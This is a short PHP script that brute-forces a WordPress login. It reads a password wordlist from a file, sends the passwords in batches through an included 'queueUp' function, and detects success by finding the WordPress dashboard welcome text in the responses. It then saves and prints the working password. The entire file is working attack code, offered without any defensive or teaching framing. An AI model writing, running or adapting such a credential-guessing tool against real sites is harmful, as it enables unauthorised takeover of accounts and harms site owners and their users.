<?php
require 'queueUp.php';

$time_start = microtime(true);
// $array_of_passwords = ['one', 'two', 'three', 'four', 'five', 'password01'];

$fileHere = fopen("smallList.txt", "r") or die ("Cant open file!");
while(!feof($fileHere)){

    //put stuff here
    $array_of_passwords[] = fgets($fileHere);
}
fclose($fileHere);

//add the chunks here:
$chunksOfPasswords = array_chunk($array_of_passwords, 956);

foreach($chunksOfPasswords as $i =>$chunkPiece){
    //move code in here

    $answer = queueUp($chunkPiece);

    // print_r($answer);

    $needle = "Welcome to your WordPress Dashboard!";

    foreach($answer as $i=>$piece){
    

        //Search the resultFromCurl content for the needle. It will be NOT false when it finds something (returned as an int)
        $checker = strpos($piece, $needle);

        if($checker){
            //use the piece key to 
            // echo "The number of the array that worked was: " .$i;
            //echo "The number of the array that worked was: ";

            $workingPassword = $chunkPiece[$i];
            //echo $workingPassword;

            file_put_contents("passwordsThatWorked.txt", $workingPassword, FILE_APPEND);
            echo "It worked!! The password is $workingPassword \n";
            echo "Exiting.. \n";
            $time_end = microtime(true);
            $execution_time = ($time_end - $time_start)/60;
            echo 'Total Execution Time: ' . $execution_time . ' minutes'. "\n";
            exit();

        }
        
    }
}


